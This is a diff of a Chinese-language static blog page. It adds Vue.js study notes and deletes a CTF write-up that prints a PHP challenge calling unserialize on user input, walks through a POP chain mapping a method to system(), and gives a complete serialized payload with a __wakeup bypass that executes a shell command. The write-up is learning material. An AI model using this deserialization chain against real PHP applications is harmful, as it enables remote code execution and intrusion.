@@ -127,7 +127,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/26/NKCTF-vm/" data-id="clu7pilys0001r0b5cw5fhhzz" data-title="NKCTF-vm" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/26/NKCTF-vm/" data-id="clu7pl2pu0002q8b5aiq9et2s" data-title="NKCTF-vm" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -173,7 +173,109 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" data-id="clu7pilz0000nr0b5gbfsfezi" data-title="无列名注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" data-id="clu7pl2q1000pq8b5ap6gfg96" data-title="无列名注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-vue" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/20/vue/" class="article-date">
+  <time class="dt-published" datetime="2024-03-20T11:10:42.000Z" itemprop="datePublished">2024-03-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/20/vue/">vue</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>简单学学，简单记</p>
+<p><strong>插值语法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Hello,&#123;&#123;name&#125;&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; &gt;</span><br><span class="line">    Vue.config.productionTip = false //阻止vue在启动时生成生产提示</span><br><span class="line"></span><br><span class="line">    new Vue(&#123;  </span><br><span class="line">            el:&#x27;#root&#x27;,//el用于指定当前vue实例为哪个容器服务，值通常为css选择器字符串</span><br><span class="line">            data:&#123;//用于存储数据，用于el储存的容器使用，值暂时先写成一个对象</span><br><span class="line">                name:&#x27;123&#x27;</span><br><span class="line">            &#125; </span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以上是vue基本格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Hello,&#123;&#123;name&#125;&#125;&lt;/h1&gt;，这里面&#123;&#123;name&#125;&#125;叫插值语法，使页面动态，灵活，大括号里面写js表达式</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">el:&#x27;#root&#x27;这部分只能单对单，如果需要单对多，会使用组件</span><br></pre></td></tr></table></figure>
+
+<p><strong>指令语法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a v-bind:href=&quot;url&quot;&gt;点我去...&lt;/a&gt;</span><br><span class="line">new Vue(&#123;  </span><br><span class="line">    el:&#x27;#root&#x27;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        url:&#x27;http://.....&#x27;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>用于解析标签，v-bind用于单向绑定</p>
+<p><strong>绑定</strong></p>
+<p>分为单向绑定和双向绑定<br>双向绑定举例v-model，特点是可以做到数据影响页面的同时页面也影响数据<br>v-model不支持一定类型，只能应用于表单类元素（有输入值的）</p>
+<p><strong>el和data的两种写法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;  </span><br><span class="line">    el:&#x27;#root&#x27;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        url:&#x27;http://.....&#x27;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;)</span><br><span class="line">等同于</span><br><span class="line">const v = new Vue(&#123;  </span><br><span class="line">    data:&#123;</span><br><span class="line">        url:&#x27;http://.....&#x27;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;)</span><br><span class="line">v.$mount(&#x27;#root&#x27;)</span><br><span class="line">第二种灵活点</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data:&#123;</span><br><span class="line">        url:&#x27;http://.....&#x27;</span><br><span class="line">    &#125; </span><br><span class="line">等同于</span><br><span class="line">data:function()&#123;</span><br><span class="line">	return&#123;</span><br><span class="line">		url:&#x27;http://.....&#x27;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面data的第二种不能写成箭头函数，一旦写了箭头函数，this就不再是Vue实例变成window了<br>茴香豆.jpg</p>
+<p><strong>MVVM模型</strong></p>
+<p>链接dom和数据</p>
+<p><strong>Object.defineProprety方法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    let person=&#123;</span><br><span class="line">        name:&#x27;张三&#x27;,</span><br><span class="line">        sex:&#x27;男&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Object.defineProperty(person,&#x27;age&#x27;,&#123;</span><br><span class="line">        value:18</span><br><span class="line">    &#125;)</span><br><span class="line">    console.log(person)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这种方法不参与遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty(person,&#x27;age&#x27;,&#123;</span><br><span class="line">            value:18,</span><br><span class="line">            enumerable:true</span><br><span class="line">        &#125;)</span><br><span class="line">这样就行</span><br></pre></td></tr></table></figure>
+
+<p>这种方法不能通过控制台修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty(person,&#x27;age&#x27;,&#123;</span><br><span class="line">            value:18,</span><br><span class="line">            writable:true</span><br><span class="line">        &#125;)</span><br><span class="line">这样就行</span><br></pre></td></tr></table></figure>
+
+<p>同理,删除-&gt;configurable:true</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;object&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        let number=18</span><br><span class="line">        let person=&#123;</span><br><span class="line">            name:&#x27;张三&#x27;,</span><br><span class="line">            sex:&#x27;男&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Object.defineProperty(person,&#x27;age&#x27;,&#123;</span><br><span class="line">            get:function()&#123;</span><br><span class="line">                console.log(&#x27;读取了&#x27;)</span><br><span class="line">                return number</span><br><span class="line">            &#125;,</span><br><span class="line">            set:function(value)&#123;</span><br><span class="line">                console.log(&#x27;有人修改了age属性&#x27;)</span><br><span class="line">                number=value</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        console.log(person)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用Object.defineProperty这个方法可以把’number’和’person’联系起来<br>这里面两个方法有点像魔术方法捏</p>
+<p><strong>事件处理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">	ShowInfo:(event)&#123;</span><br><span class="line">		console.log(event.target)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>事件修饰符</strong></p>
+<ol>
+<li><code>.stop</code> 修饰符阻止事件继续传播。</li>
+<li><code>.prevent</code> 修饰符阻止事件的默认行为。</li>
+<li><code>.capture</code> 修饰符将事件侦听器添加到父元素而不是子元素。</li>
+<li><code>.self</code> 修饰符只有在事件是从侦听器绑定的元素本身触发时才触发回调。</li>
+<li><code>.once</code> 修饰符只会执行一次事件处理函数。</li>
+<li><code>.passive</code> 修饰符告诉浏览器你不想阻止事件默认行为。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button v-on:click.stop=&quot;doSomething&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>键盘事件</strong></p>
+<ol>
+<li><code>enter</code> - 回车键</li>
+<li><code>tab</code> - 制表键</li>
+<li><code>delete</code> - 删除键</li>
+<li><code>esc</code> - ESC 键</li>
+<li><code>space</code> - 空格键</li>
+<li><code>up</code> - 向上箭头键</li>
+<li><code>down</code> - 向下箭头键</li>
+<li><code>left</code> - 向左箭头键</li>
+<li><code>right</code> - 向右箭头键</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@keyup.esc=&quot;showInfo&quot;</span><br><span class="line">Vue.config.keyCodes.huiche = 13//自定义一个别名按键</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/20/vue/" data-id="clu7pl2pz000iq8b59cccevb5" data-title="vue" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -275,7 +377,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/" data-id="clu7pilyt0003r0b5bh3j7axw" data-title="java稍进阶" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/" data-id="clu7pl2pw0005q8b5crd40k89" data-title="java稍进阶" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -391,7 +493,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/Java%E5%9F%BA%E7%A1%80/" data-id="clu7pilyp0000r0b59sq4djma" data-title="Java基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/Java%E5%9F%BA%E7%A1%80/" data-id="clu7pl2pr0000q8b5684adalu" data-title="Java基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -459,7 +561,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/12/XXE/" data-id="clu7pilyu0007r0b58n7t9h3v" data-title="XXE" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/12/XXE/" data-id="clu7pl2pu0001q8b5c7hw33m3" data-title="XXE" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -522,7 +624,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/07/ssrf/" data-id="clu7pilyx000fr0b55bffb2xy" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/07/ssrf/" data-id="clu7pl2pz000gq8b5bjn76vod" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -667,7 +769,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" data-id="clu7pilz3000pr0b56czfdm0s" data-title="原生类" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" data-id="clu7pl2q0000mq8b5gmmygy3h" data-title="原生类" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -723,7 +825,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/04/phototype-1/" data-id="clu7pilyu0006r0b5fowefphe" data-title="phototype_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/04/phototype-1/" data-id="clu7pl2py000bq8b5gxdnax8e" data-title="phototype_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -789,103 +891,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/03/phototype/" data-id="clu7pilyu0005r0b594u85jvc" data-title="phototype" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-n-ez-unserilize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/03/n-ez-unserilize/" class="article-date">
-  <time class="dt-published" datetime="2024-03-03T05:17:45.000Z" itemprop="datePublished">2024-03-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/03/03/n-ez-unserilize/">n_ez_unserilize</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">class Cache &#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $value;</span><br><span class="line">    public $expired;</span><br><span class="line">    public $helper;</span><br><span class="line"></span><br><span class="line">    public function __construct($key, $value, $helper) &#123;</span><br><span class="line">        $this-&gt;key = $key;</span><br><span class="line">        $this-&gt;value = $value;</span><br><span class="line">        $this-&gt;helper = $helper;</span><br><span class="line"></span><br><span class="line">        $this-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function expired() &#123;</span><br><span class="line">        if ($this-&gt;expired) &#123;</span><br><span class="line">            $this-&gt;helper-&gt;clean($this-&gt;key);</span><br><span class="line">            return True;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Storage &#123;</span><br><span class="line">    public $store;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;store = array();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __set($name, $value) &#123;</span><br><span class="line">        if (!$this-&gt;store) &#123;</span><br><span class="line">            $this-&gt;store = array();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!$value-&gt;expired()) &#123;</span><br><span class="line">            $this-&gt;store[$name] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        return $this-&gt;data[$name];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Helper &#123;</span><br><span class="line">    public $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($funcs) &#123;</span><br><span class="line">        $this-&gt;funcs = $funcs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $args) &#123;</span><br><span class="line">        $this-&gt;funcs[$name](...$args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DataObject &#123;</span><br><span class="line">    public $storage;</span><br><span class="line">    public $data;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        foreach ($this-&gt;data as $key =&gt; $value) &#123;</span><br><span class="line">            $this-&gt;storage-&gt;$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;u&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;u&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>先统计一下里面用到的魔术方法</p>
-<ol>
-<li><p>__construct()</p>
-</li>
-<li><p>__destruct()</p>
-</li>
-<li><p>__wakeup()</p>
-</li>
-<li><p>__get()</p>
-</li>
-<li><p>__set()</p>
-</li>
-<li><p>__call()</p>
-<p>再看一眼属性，都是public</p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;u&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;u&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>要么从wakeup开始，要么从construct开始，看下内容，是后者，把 <code>DataObject</code> 记录为1号</p>
-<p>从 <code>Cache</code> 开始看起，发现 <code>$this-&gt;helper-&gt;clean($this-&gt;key);</code> </p>
-<p>可以触发__call()</p>
-<p>看一下__call()内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;funcs[$name](...$args);</span><br></pre></td></tr></table></figure>
-
-<p>搜了一下，这句是可变函数调用语法，第一次遇到可变函数调用，还不太会用，不过既然是调用就排在最后一步<br>那么<code>Cache</code>定为倒数第二步</p>
-<p>回来看<code>DataObject</code>，里面存在一个赋值$key的操作， <code>$this-&gt;storage-&gt;$key</code> 成员命名是个线索，正好能跟 <code>Storage</code> 联系起来，（代码里Cache里面也存在$key,不过__construct会赋值），触发set方法</p>
-<p>代码里存在一个wakeup方法，其方法会使后面的i判断不成立，也就无法调用clean方法，这一点需要wakeup绕过</p>
-<hr>
-<p>逻辑顺序清楚了，从最后一步看起  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当调用一个对象中不存在的方法时，会自动触发`__call()`方法。在这里，`__call()`方法接受两个参数：name表示调用的方法名，name表示调用的方法名，args表示传递给该方法的参数数组。</span><br></pre></td></tr></table></figure>
-
-<p>也就是说目标语句在数组里面键值为clean</p>
-<p>$helper&#x3D;new Helper();</p>
-<p>$helper-&gt;funcs&#x3D;array(‘clean’&#x3D;&gt;’system’);</p>
-<hr>
-<p>之后是cache部分</p>
-<p>$cache&#x3D;new Cache();</p>
-<p>$cache-&gt;helper&#x3D;$helper;</p>
-<p>$cache-&gt;expired&#x3D;True;</p>
-<p>$cache-&gt;key&#x3D;’php -r “phpinfo();”‘;</p>
-<p>第三行是为了通过if判断从而触发clean方法</p>
-<hr>
-<p>再之后是</p>
-<p>$storage&#x3D;new Storage();</p>
-<p>$dataObject&#x3D;new DataObject();</p>
-<p>$dataObject-&gt;data&#x3D;array(‘key’&#x3D;&gt;$cache);</p>
-<p>$dataObject-&gt;storage&#x3D;$storage;</p>
-<hr>
-<p>最最后别忘了wakeup的绕过，方法是使序列化之后表示成员数量的值大于实际的成员数量</p>
-<p>具体比较可以看一下后面pop链跑出来的和payload的区别</p>
-<p><img src="/images/3.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=O:10:&quot;DataObject&quot;:2:&#123;s:7:&quot;storage&quot;;O:7:&quot;Storage&quot;:1:&#123;s:5:&quot;store&quot;;N;&#125;s:4:&quot;data&quot;;a:1:&#123;s:3:&quot;key&quot;;O:5:&quot;Cache&quot;:66:&#123;s:3:&quot;key&quot;;s:19:&quot;php -r &quot;phpinfo();&quot;&quot;;s:5:&quot;value&quot;;N;s:7:&quot;expired&quot;;b:1;s:6:&quot;helper&quot;;O:6:&quot;Helper&quot;:1:&#123;s:5:&quot;funcs&quot;;a:1:&#123;s:5:&quot;clean&quot;;s:6:&quot;system&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/3.png"></p>
-<p>最后再放一下通关flag</p>
-<p><img src="/images/2.png"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/03/n-ez-unserilize/" data-id="clu7pilyu0004r0b554m2bleq" data-title="n_ez_unserilize" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/03/phototype/" data-id="clu7pl2pw0007q8b5c3elecki" data-title="phototype" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -955,15 +961,15 @@
           </li>
         
           <li>
+            <a href="/2024/03/20/vue/">vue</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/">java稍进阶</a>
           </li>
         
           <li>
             <a href="/2024/03/15/Java%E5%9F%BA%E7%A1%80/">Java基础</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/12/XXE/">XXE</a>
           </li>
         
       </ul>
